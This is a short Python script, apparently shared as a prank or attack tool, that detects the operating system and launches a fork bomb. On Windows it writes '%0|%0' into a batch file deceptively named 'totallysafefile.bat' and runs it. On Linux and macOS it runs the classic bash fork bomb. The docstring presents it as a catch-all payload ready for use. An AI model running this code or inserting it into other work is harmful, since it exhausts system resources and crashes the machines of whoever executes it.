"""

Made by: Cypress

A 'smart' fork bomb, detects the OS and executes a fork bomb based on the system
Purpose: Way easier than trying to find the right payload, this is a catch-all and will do the work for you

"""

import platform, os

print(platform.system())

def get_platform():
    if platform.system() == 'Linux':
        return 1

    elif platform.system() == 'Windows':
        return 2

    elif platform.system() == 'Darwin':
        return 3

def crash_windows():
    with open("totallysafefile.bat", "w+") as windows:
        windows.write("%0|%0")
    os.system("totallysafefile.bat")

def _crash_nix():
    os.system("bash -c ':(){ :|: & };:'")

def crash_linux():
    _crash_nix()

def crash_mac():
    _crash_nix()

if get_platform() == 1:
    crash_linux()

elif get_platform() == 2:
    crash_windows()

elif get_platform() == 3:
    crash_mac()
